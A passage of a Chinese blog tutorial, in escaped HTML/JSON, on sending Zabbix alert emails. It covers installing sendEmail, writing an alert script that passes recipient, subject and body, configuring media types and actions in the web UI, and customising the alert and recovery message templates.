class=\"line\"></span><br><span class=\"line\">&#x544A;&#x8B66;&#x9879;&#x76EE;:{TRIGGER.KEY1}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x95EE;&#x9898;&#x8BE6;&#x60C5;:{ITEM.NAME}:{ITEM.VALUE}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x5F53;&#x524D;&#x72B6;&#x6001;:{TRIGGER.STATUS}:{ITEM.VALUE1}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x4E8B;&#x4EF6;ID:{EVENT.ID}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">====================================================</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x6062;&#x590D;&#x4E3B;&#x65E8;:</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#x6062;&#x590D;{TRIGGER.STATUS}&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x3010;{HOST.NAME1}&#x3011;&#x6545;&#x969C;&#x3010; {TRIGGER.NAME}&#x3011;&#x5DF2;&#x6062;&#x590D;&#xFF01;</span><br><span class=\"line\"></span><br><span class=\"line\">====================================================</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x6062;&#x590D;&#x4FE1;&#x606F;:</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#x544A;&#x8B66;&#x4E3B;&#x673A;:{HOST.NAME1}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x544A;&#x8B66;&#x65F6;&#x95F4;:{EVENT.DATE} {EVENT.TIME}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x544A;&#x8B66;&#x7B49;&#x7EA7;:{TRIGGER.SEVERITY}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x544A;&#x8B66;&#x4FE1;&#x606F;: {TRIGGER.NAME}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x544A;&#x8B66;&#x9879;&#x76EE;:{TRIGGER.KEY1}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x95EE;&#x9898;&#x8BE6;&#x60C5;:{ITEM.NAME}:{ITEM.VALUE}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x5F53;&#x524D;&#x72B6;&#x6001;:{TRIGGER.STATUS}:{ITEM.VALUE1}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x4E8B;&#x4EF6;ID:{EVENT.ID}&lt;br/&gt;</span><br></pre></td></tr></table></figure></p>\n<p>&#x66F4;&#x6539;&#x540E;&#xFF0C;&#x6536;&#x5230;&#x7684;&#x90AE;&#x4EF6;&#x6837;&#x5F0F;&#x5982;&#x4E0B;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/17.png\" alt=\"\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/18.png\" alt=\"\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/19.png\" alt=\"\"></p>\n","excerpt":"<h3 id=\"&#x793A;&#x8B66;&#x5A92;&#x4ECB;\"><a href=\"#&#x793A;&#x8B66;&#x5A92;&#x4ECB;\" class=\"headerlink\" title=\"&#x793A;&#x8B66;&#x5A92;&#x4ECB;\"></a>&#x793A;&#x8B66;&#x5A92;&#x4ECB;</h3><p>&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;zabbix&#x76D1;&#x63A7;&#x4E3B;&#x673A;&#x90FD;&#x914D;&#x7F6E;&#x4E86;&#x89E6;&#x53D1;&#x5668;&#xFF0C;&#x89E6;&#x53D1;&#x5668;&#x88AB;&#x89E6;&#x53D1;&#x53D1;&#x9001;&#x6D88;&#x606F;&#x7ED9;&#x8FD0;&#x7EF4;&#xFF0C;&#x9700;&#x8981;&#x4E2D;&#x95F4;&#x4ECB;&#x8D28;&#x6765;&#x63A5;&#x6536;&#x5E76;&#x4F20;&#x9012;&#x6D88;&#x606F;&#x3002;</p>\n<p>zabbix&#x9ED8;&#x8BA4;&#x7684;&#x3010;&#x793A;&#x8B66;&#x5A92;&#x4ECB;&#x7C7B;&#x578B;&#x3011;&#x6709;&#x4E09;&#x79CD;&#xFF0C;Email&#x3001;Jabber&#x3001;SMS&#x3002;<br>&#xFF08;1&#xFF09;Email&#xFF1A;&#x4F7F;&#x7528;sendmail&#x53D1;&#x9001;&#x90AE;&#x4EF6;&#xFF0C;&#x4ECE;&#x8FD9;&#x8FB9;&#x51FA;&#x53BB;&#x7684;&#x90AE;&#x4EF6;&#x57FA;&#x672C;&#x662F;&#x5783;&#x573E;&#x90AE;&#x4EF6;&#x3002;<br>&#xFF08;2&#xFF09;SMS&#xFF1A;&#x9700;&#x8981;&#x77ED;&#x4FE1;&#x8BBE;&#x5907;&#xFF0C;&#x6CA1;&#x6709;&#xFF0C;&#x6240;&#x4EE5;&#x6CA1;&#x7528;&#x8FC7;&#x8FD9;&#x4E1C;&#x897F;<br>&#xFF08;3&#xFF09;Jabber:Jabber&#x6709;&#x7B2C;&#x4E09;&#x65B9;&#x63D2;&#x4EF6;&#xFF0C;&#x80FD;&#x8BA9;Jabber&#x7528;&#x6237;&#x548C;MSN&#x3001;YahooMessager&#x3001;ICQ&#x7B49;IM&#x7528;&#x6237;&#x76F8;&#x4E92;&#x901A;&#x8BAF;&#x3002;&#x56E0;&#x4E3A;Google&#x9075;&#x4ECE;Jabber&#x534F;&#x8BAE;&#xFF0C;&#x5E76;&#x4E14;Google&#x5DF2;&#x7ECF;&#x5C06;Gtalk&#x7684;&#x670D;&#x52A1;&#x5668;&#x5F00;&#x653E;&#x7ED9;&#x4E86;&#x5176;&#x5B83;&#x7684;Jabber&#x670D;&#x52A1;&#x5668;&#x3002;&#x6240;&#x4EE5;PSI&#x3001;Giam&#x7B49;Jabber&#x5BA2;&#x6237;&#x7AEF;&#x8F6F;&#x4EF6;&#x652F;&#x6301;GTalk&#x7528;&#x6237;&#x767B;&#x9646;&#x3002;&#x56FD;&#x5185;&#x6CA1;&#x5565;&#x4EBA;&#x7528;&#x3002;</p>\n<p>sendEmail&#x662F;&#x4E00;&#x4E2A;&#x8F7B;&#x91CF;&#x7EA7;&#xFF0C;&#x547D;&#x4EE4;&#x884C;&#x7684;SMTP&#x90AE;&#x4EF6;&#x5BA2;&#x6237;&#x7AEF;&#x3002;&#x5982;&#x679C;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x547D;&#x4EE4;&#x884C;&#x53D1;&#x9001;&#x90AE;&#x4EF6;&#xFF0C;&#x90A3;&#x4E48;sendEmail&#x662F;&#x4E0D;&#x9519;&#x7684;&#x9009;&#x62E9;&#x3002;sendEmail&#x4F7F;&#x7528;&#x7B80;&#x5355;&#x5E76;&#x4E14;&#x529F;&#x80FD;&#x5F3A;&#x5927;&#x3002;&#x8FD9;&#x4E2A;&#x88AB;&#x8BBE;&#x8BA1;&#x7528;&#x5728;php&#x3001;perl&#x548C;web&#x7AD9;&#x70B9;&#x4F7F;&#x7528;&#x3002;<strong>&#x8BF7;&#x6CE8;&#x610F;&#xFF0C;&#x4E0D;&#x662F;sendmail&#x3002;</strong></p>\n<hr>\n<h3 id=\"sendEmail&#x5B89;&#x88C5;\"><a href=\"#sendEmail&#x5B89;&#x88C5;\" class=\"headerlink\" title=\"sendEmail&#x5B89;&#x88C5;\"></a>sendEmail&#x5B89;&#x88C5;</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># &#x4E0B;&#x8F7D;&#x8F6F;&#x4EF6;</span></span><br><span class=\"line\">wget http://caspian.dotconf.net/menu/Software/SendEmail/sendEmail-v1.56.tar.gz</span><br><span class=\"line\"><span class=\"comment\"># &#x89E3;&#x538B;&#x8F6F;&#x4EF6;</span></span><br><span class=\"line\"><span class=\"comment\"># tar zxvf sendEmail-v1.56.tar.gz</span></span><br><span class=\"line\"><span class=\"comment\"># &#x8FDB;&#x5165;&#x76EE;&#x5F55;</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> /usr/src/sendEmail-v1.56</span><br><span class=\"line\"><span class=\"comment\"># &#x521B;&#x5EFA;&#x76EE;&#x5F55;</span></span><br><span class=\"line\">mkdir /usr/<span class=\"built_in\">local</span>/bin</span><br><span class=\"line\"><span class=\"comment\"># &#x590D;&#x5236;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x8BBE;&#x7F6E;&#x6743;&#x9650;</span></span><br><span class=\"line\">cp <span class=\"_\">-a</span> sendEmail /usr/<span class=\"built_in\">local</span>/bin</span><br><span class=\"line\">chmod +x /usr/<span class=\"built_in\">local</span>/bin/sendEmail</span><br><span class=\"line\"><span class=\"comment\"># &#x5B89;&#x88C5;&#x7EC4;&#x4EF6;</span></span><br><span class=\"line\">yum install perl-Net-SSLeay perl-IO-Socket-SSL -y</span><br></pre></td></tr></table></figure>","more":"<hr>\n<h3 id=\"zabbix-server&#x7AEF;&#x914D;&#x7F6E;\"><a href=\"#zabbix-server&#x7AEF;&#x914D;&#x7F6E;\" class=\"headerlink\" title=\"zabbix server&#x7AEF;&#x914D;&#x7F6E;\"></a>zabbix server&#x7AEF;&#x914D;&#x7F6E;</h3><p>&#x8FDB;&#x5165;zabbix&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x6307;&#x5B9A;&#x76EE;&#x5F55;<br>&#x53EF;&#x4EE5;&#x67E5;&#x770B;zabbix_server.conf&#x914D;&#x7F6E;&#x6587;&#x4EF6;AlertScriptsPath&#x53D8;&#x91CF;&#x662F;&#x5982;&#x4F55;&#x5B9A;&#x4E49;&#x7684;&#x3002;</p>\n<p>&#x8FDB;&#x5165;&#x76F8;&#x5173;&#x76EE;&#x5F55;<br>cd /usr/lib/zabbix/alertscripts</p>\n<p>&#x65B0;&#x5EFA;sendEmail.sh&#x811A;&#x672C;&#xFF0C;&#x5185;&#x5BB9;&#x5982;&#x4E0B;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span><br><span class=\"line\"></span></span><br><span class=\"line\">to=<span class=\"variable\">$1</span></span><br><span class=\"line\">subject=<span class=\"variable\">$2</span></span><br><span class=\"line\">body=<span class=\"variable\">$3</span></span><br><span class=\"line\">/usr/<span class=\"built_in\">local</span>/bin/sendEmail  <span class=\"_\">-f</span> a@domain.com -t <span class=\"string\">&quot;<span class=\"variable\">$to</span>&quot;</span> <span class=\"_\">-s</span> smtp.exmail.qq.com -u <span class=\"string\">&quot;<span class=\"variable\">$subject</span>&quot;</span> -o message-content-type=html -o message-charset=utf8 -xu a@domain.com -xp password -m <span class=\"string\">&quot;<span class=\"variable\">$body</span>&quot;</span></span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>a@domain.com &#x8868;&#x793A;&#x53D1;&#x4EF6;&#x4EBA;&#x90AE;&#x7BB1;<br>smtp.exmail.qq.com &#x8868;&#x793A;&#x90AE;&#x7BB1;&#x7684;smtp&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x8FD9;&#x91CC;&#x7528;&#x7684;&#x662F;&#x817E;&#x8BAF;&#x90AE;&#x7BB1;&#x3002;<br>password &#x8868;&#x793A;&#x53D1;&#x4EF6;&#x4EBA;&#x90AE;&#x7BB1;&#x5BC6;&#x7801;</p>\n</blockquote>\n<p>&#x7F16;&#x8F91;&#x5B8C;&#x6210;&#x540E;&#xFF0C;&#x7ED9;&#x811A;&#x672C;&#x6743;&#x9650;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod +x sendEmail.sh</span><br><span class=\"line\">chown zabbix.zabbix sendEmail.sh</span><br></pre></td></tr></table></figure></p>\n<p>&#x624B;&#x52A8;&#x6267;&#x884C;&#x4E00;&#x6B21;&#x811A;&#x672C;&#xFF0C;&#x540E;&#x9762;&#x7684;&#x53C2;&#x6570;&#x5206;&#x522B;&#x5BF9;&#x5E94;&#x63A5;&#x6536;&#x4EBA;&#xFF0C;&#x4E3B;&#x9898;&#xFF0C;&#x5185;&#x5BB9;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./sendEmail.sh c@domain.com <span class=\"built_in\">test</span> 123</span><br></pre></td></tr></table></figure></p>\n<p>&#x767B;&#x5F55;c@domain.com&#x7684;&#x8D26;&#x6237;&#xFF0C;&#x67E5;&#x770B;&#x90AE;&#x4EF6;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6536;&#x5230;<br>&#x5982;&#x679C;&#x811A;&#x672C;&#x6267;&#x884C;&#x6CA1;&#x6709;&#x62A5;&#x9519;&#xFF0C;&#x6536;&#x4E0D;&#x5230;&#x90AE;&#x4EF6;&#x7684;&#x8BDD;&#xFF0C;&#x8BF7;&#x68C0;&#x67E5;linux&#x7F51;&#x7EDC;&#x95EE;&#x9898;,iptables&#x3001;selinux&#x662F;&#x5426;&#x5173;&#x95ED;&#x3002;</p>\n<hr>\n<h3 id=\"zabbix-web&#x7AEF;&#x914D;&#x7F6E;\"><a href=\"#zabbix-web&#x7AEF;&#x914D;&#x7F6E;\" class=\"headerlink\" title=\"zabbix web&#x7AEF;&#x914D;&#x7F6E;\"></a>zabbix web&#x7AEF;&#x914D;&#x7F6E;</h3><p>&#x8FDB;&#x5165;zabbix&#x7BA1;&#x7406;&#x9875;&#x9762;<br>&#x70B9;&#x51FB;&#x7BA1;&#x7406;-&gt;&#x62A5;&#x8B66;&#x5A92;&#x4ECB;&#x7C7B;&#x578B; &#x70B9;&#x51FB;&#x6700;&#x53F3;&#x8FB9;&#x7684;&#x521B;&#x5EFA;&#x5A92;&#x4F53;&#x7C7B;&#x578B;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/1.png\" alt=\"\"><br>&#x8F93;&#x5165;&#x811A;&#x672C;&#x540D;&#x79F0;&#xFF0C;&#x7C7B;&#x578B;&#x9009;&#x62E9;&#x811A;&#x672C;<br>&#x6DFB;&#x52A0;&#x4EE5;&#x4E0B;3&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x5206;&#x522B;&#x5BF9;&#x5E94;sendEmail.sh&#x811A;&#x672C;&#x9700;&#x8981;&#x7684;3&#x4E2A;&#x53C2;&#x6570;&#xFF1A;&#x6536;&#x4EF6;&#x4EBA;&#x5730;&#x5740;&#x3001;&#x4E3B;&#x9898;&#x3001;&#x8BE6;&#x7EC6;&#x5185;&#x5BB9;<br>{ALERT.SENDTO}<br>{ALERT.SUBJECT}<br>{ALERT.MESSAGE}</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/2.png\" alt=\"\"><br>&#x89E3;&#x91CA;:&#x5F88;&#x591A;&#x4EBA;&#x5B89;&#x88C5;zabbix 3.0&#x4E4B;&#x540E;&#xFF0C;&#x5199;&#x7684;&#x811A;&#x672C;&#x4E00;&#x76F4;&#x53D1;&#x4FE1;&#x4E0D;&#x6210;&#x529F;,&#x624B;&#x52A8;&#x6267;&#x884C;&#x65F6;&#x53EF;&#x4EE5;&#x7684;&#x3002;<br>&#x90A3;&#x662F;&#x56E0;&#x4E3A;zabbix3.0&#x4E4B;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#x53C2;&#x6570;&#x4E86;&#x3002;&#x6240;&#x4EE5;&#x4E0D;&#x5199;&#x53C2;&#x6570;&#xFF0C;&#x5B83;&#x662F;&#x4E0D;&#x4F1A;&#x4F20;&#x53C2;&#x6570;&#x7684;&#x3002;<br>&#x5728;2.x&#x7248;&#x672C;&#x4E0D;&#x5B58;&#x5728;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x9ED8;&#x8BA4;&#x4F1A;&#x4F20;3&#x4E2A;&#x53C2;&#x6570;&#x3002;</p>\n<p>&#x70B9;&#x51FB;Admin&#x7528;&#x6237;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/3.png\" alt=\"\"><br>&#x70B9;&#x51FB;&#x6DFB;&#x52A0;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/4.png\" alt=\"\"><br>&#x9009;&#x62E9;sendEmail.sh&#x811A;&#x672C;&#xFF0C;&#x8F93;&#x5165;&#x6536;&#x4EF6;&#x4EBA;&#x7684;&#x90AE;&#x7BB1;&#x5730;&#x5740;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/5.png\" alt=\"\"><br>&#x70B9;&#x51FB;&#x7528;&#x6237;&#x7FA4;&#x7EC4;&#xFF0C;&#x70B9;&#x51FB;zabbix administrator&#x540E;&#x9762;&#x7684;&#x8C03;&#x7528;&#x6A21;&#x5F0F;&#xFF0C;&#x70B9;&#x51FB;&#x4E00;&#x4E0B;&#xFF0C;&#x5C31;&#x542F;&#x7528;&#x4E86;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/6.png\" alt=\"\"><br>&#x70B9;&#x6743;&#x9650;-&gt;&#x6DFB;&#x52A0;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/7.png\" alt=\"\"></p>\n<p>&#x9009;&#x62E9;&#x6240;&#x6709;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/8.png\" alt=\"\"><br>&#x70B9;&#x51FB;&#x66F4;&#x65B0;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/9.png\" alt=\"\"><br>&#x70B9;&#x51FB;&#x914D;&#x7F6E;-&gt;&#x52A8;&#x4F5C; &#x70B9;&#x51FB;&#x9ED8;&#x8BA4;&#x7684;&#x52A8;&#x4F5C;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/10.png\" alt=\"\"><br>&#x70B9;&#x51FB;&#x64CD;&#x4F5C;-&gt;&#x7F16;&#x8F91;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/11.png\" alt=\"\"><br>&#x4FEE;&#x6539;&#x6301;&#x7EED;&#x65F6;&#x95F4;&#x4E3A;60&#x79D2;<br>&#x4FEE;&#x6539;&#x6B65;&#x9AA4;&#x4E3A;3,&#x8868;&#x793A;&#x89E6;&#x53D1;3&#x6B21;&#x52A8;&#x4F5C;<br>&#x9009;&#x62E9;&#x7528;&#x6237;Admin<br>&#x9009;&#x62E9;&#x4EC5;&#x9001;&#x5230;sendEmail.sh<br>&#x70B9;&#x51FB;&#x66F4;&#x65B0;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/12.png\" alt=\"\"><br>&#x70B9;&#x51FB;&#x66F4;&#x65B0;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/13.png\" alt=\"\"><br>&#x89E3;&#x91CA;:&#x9ED8;&#x8BA4;&#x7684;&#x6B65;&#x9AA4;&#x662F;1-1,&#x4E5F;&#x5373;&#x662F;&#x4ECE;1&#x5F00;&#x59CB;&#x5230;1&#x7ED3;&#x675F;&#x3002;&#x4E00;&#x65E6;&#x6545;&#x969C;&#x53D1;&#x751F;&#xFF0C;&#x5C31;&#x662F;&#x6267;&#x884C;sendEmail.sh&#x811A;&#x672C;&#x53D1;&#x751F;&#x62A5;&#x8B66;&#x90AE;&#x4EF6;&#x7ED9;Admin&#x7528;&#x6237;&#x548C;zabbix administrator&#x7EC4;&#x3002;<br>&#x5047;&#x5982;&#x6545;&#x969C;&#x6301;&#x7EED;&#x4E86;1&#x4E2A;&#x5C0F;&#x65F6;&#xFF0C;&#x5B83;&#x4E5F;&#x53EA;&#x53D1;&#x9001;&#x4E00;&#x6B21;&#x3002;&#x5982;&#x679C;&#x6539;&#x6210;1-0&#xFF0C;0&#x662F;&#x8868;&#x793A;&#x4E0D;&#x9650;&#x5236;.&#x65E0;&#x9650;&#x53D1;&#x9001;<br>&#x95F4;&#x9694;&#x5C31;&#x662F;&#x9ED8;&#x8BA4;&#x6301;&#x7EED;&#x65F6;&#x95F4;60&#x79D2;&#x3002;&#x90A3;&#x4E48;&#x4E00;&#x4E2A;&#x5C0F;&#x65F6;&#xFF0C;&#x5C31;&#x4F1A;&#x53D1;&#x9001;60&#x5C01;&#x90AE;&#x4EF6;&#x3002;<br>&#x5982;&#x679C;&#x9700;&#x8981;&#x77ED;&#x4FE1;&#x62A5;&#x8B66;&#x7684;&#x8BDD;,&#x53EF;&#x4EE5;&#x518D;&#x521B;&#x5EFA;&#x4E00;&#x6761;&#x65B0;&#x7684;&#x52A8;&#x4F5C;&#xFF0C;&#x9009;&#x62E9;&#x77ED;&#x4FE1;&#x811A;&#x672C;&#x3002;</p>\n<hr>\n<h3 id=\"&#x90AE;&#x4EF6;&#x6D4B;&#x8BD5;&#x53CA;&#x6A21;&#x677F;&#x4FEE;&#x6539;\"><a href=\"#&#x90AE;&#x4EF6;&#x6D4B;&#x8BD5;&#x53CA;&#x6A21;&#x677F;&#x4FEE;&#x6539;\" class=\"headerlink\" title=\"&#x90AE;&#x4EF6;&#x6D4B;&#x8BD5;&#x53CA;&#x6A21;&#x677F;&#x4FEE;&#x6539;\"></a>&#x90AE;&#x4EF6;&#x6D4B;&#x8BD5;&#x53CA;&#x6A21;&#x677F;&#x4FEE;&#x6539;</h3><p>&#x4E0B;&#x9762;&#x5F00;&#x59CB;&#x6D4B;&#x8BD5;&#x90AE;&#x4EF6;&#x62A5;&#x8B66;<br>&#x5148;&#x6DFB;&#x52A0;&#x4E00;&#x53F0;&#x4E3B;&#x673A;test&#xFF0C;&#x4E0D;&#x5B58;&#x5728;&#x7684;IP&#x5730;&#x5740;<br>&#x7B49;&#x5F85;&#x51E0;&#x5206;&#x949F;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x662F;&#x7EA2;&#x8272;&#x72B6;&#x6001;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/14.png\" alt=\"\"><br>&#x7B49;&#x5F85;&#x51E0;&#x5206;&#x949F;&#xFF0C;&#x5C31;&#x4F1A;&#x6536;&#x5230;&#x90AE;&#x4EF6;&#x62A5;&#x8B66;&#x4E86;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/15.png\" alt=\"\"><br>&#x70B9;&#x51FB;&#x62A5;&#x8868;-&gt;&#x52A8;&#x4F5C;&#x65E5;&#x5FD7; &#x53EF;&#x4EE5;&#x770B;&#x5230;&#x89E6;&#x53D1;&#x52A8;&#x4F5C;&#x7684;&#x6B21;&#x6570;&#x3002;&#x53EA;&#x4F1A;&#x6709;3&#x6B21;&#xFF0C;&#x9664;&#x975E;test&#x4E3B;&#x673A;&#x72B6;&#x6001;&#x6539;&#x53D8;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6B63;&#x5E38;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x89E6;&#x53D1;&#x4E00;&#x6B21;,&#x5426;&#x5219;&#x4E0D;&#x4F1A;&#x518D;&#x89E6;&#x53D1;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/16.png\" alt=\"\"><br>&#x5927;&#x5BB6;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x90AE;&#x4EF6;&#x91CC;&#x9762;&#x5185;&#x5BB9;&#x90FD;&#x5806;&#x5230;&#x4E00;&#x8D77;&#x4E86;&#xFF0C;&#x6CA1;&#x6709;&#x6362;&#x884C;&#xFF0C;&#x4E14;&#x662F;&#x82F1;&#x6587;&#xFF0C;&#x53EF;&#x4EE5;&#x81EA;&#x884C;&#x4FEE;&#x6539;&#x3010;&#x7EC4;&#x6001;-&#x52A8;&#x4F5C;-&#x52A8;&#x4F5C;&#x3011;&#x91CC;&#x7684;&#x914D;&#x7F6E;&#x3002;</p>\n<p>&#x4E0B;&#x9762;&#x662F;&#x6211;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x914D;&#x7F6E;&#x4FE1;&#x606F;:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">====================================================</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x9ED8;&#x8BA4;&#x63A5;&#x6536;&#x4EBA;:</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#x6545;&#x969C;{TRIGGER.STATUS}&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x3010;{HOST.NAME1}&#x3011;&#x53D1;&#x751F;&#x3010; {TRIGGER.NAME}&#x3011;&#x6545;&#x969C;&#xFF01;</span><br><span class=\"line\"></span><br><span class=\"line\">====================================================</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># &#x9ED8;&#x8BA4;&#x4FE1;&#x606F;:</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#x544A;&#x8B66;&#x4E3B;&#x673A;:{HOST.NAME1}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x544A;&#x8B66;&#x65F6;&#x95F4;:{EVENT.DATE} {EVENT.TIME}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x544A;&#x8B66;&#x7B49;&#x7EA7;:{TRIGGER.SEVERITY}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x544A;&#x8B66;&#x4FE1;&#x606F;: {TRIGGER.NAME}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x544A;&#x8B66;&#x9879;&#x76EE;:{TRIGGER.KEY1}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x95EE;&#x9898;&#x8BE6;&#x60C5;:{ITEM.NAME}:{ITEM.VALUE}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x5F53;&#x524D;&#x72B6;&#x6001;:{TRIGGER.STATUS}:{ITEM.VALUE1}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x4E8B;&#x4EF6;ID:{EVENT.ID}&lt;br/&gt;</span><br><span class=\"line\"></span><br><span 